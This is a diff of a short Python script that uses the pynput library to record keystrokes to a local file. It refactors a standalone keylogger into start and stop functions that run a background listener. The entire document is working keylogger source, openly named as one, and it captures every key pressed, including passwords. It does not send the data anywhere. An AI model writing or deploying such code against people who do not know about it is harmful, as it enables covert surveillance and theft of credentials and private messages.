@@ -1,33 +1,32 @@
-from pynput.keyboard import Listener, Key
+from pynput import keyboard
 
-# Path to where log will be saved
-log_file = "key_log.txt"
+# Global variables
+keylogger_active = False
+listener = None
+log_file = "keylog.txt"
 
-# Function to write the key press to log file
+# Keylogger function
 def on_press(key):
     try:
-        # Log normal characters
-        with open(log_file, "a") as file:
-            file.write(key.char)
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}\n")
     except AttributeError:
-        # Handle special keys
-        special_keys = {
-            Key.space: " ",
-            Key.enter: "\n",
-            Key.tab: "\t", 
-            Key.backspace: "[BACKSPACE]",
-            Key.shift: "",
-            Key.shift_r: "",
-            Key.ctrl_l: "[CTRL]",
-            Key.ctrl_r: "[CTRL]",
-            Key.alt_l: "[ALT]",
-            Key.alt_r: "[ALT]",
-            Key.esc: "[ESC]",
-        }
+        with open(log_file, "a") as f:
+            f.write(f"{key}\n")
 
-        with open(log_file, "a") as file:
-            file.write(special_keys.get(key, f"[{key}]")) 
+def start_keylogger():
+    global keylogger_active, listener
+    if not keylogger_active:
+        keylogger_active = True
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
+        return "Keylogger started."
 
-# Start listening to the keyboard
-with Listener(on_press=on_press) as listener:
-    listener.join()
+def stop_keylogger():
+    global keylogger_active, listener
+    if keylogger_active:
+        keylogger_active = False
+        if listener:
+            listener.stop()
+        return "Keylogger stopped."
+    return "Keylogger is not running."
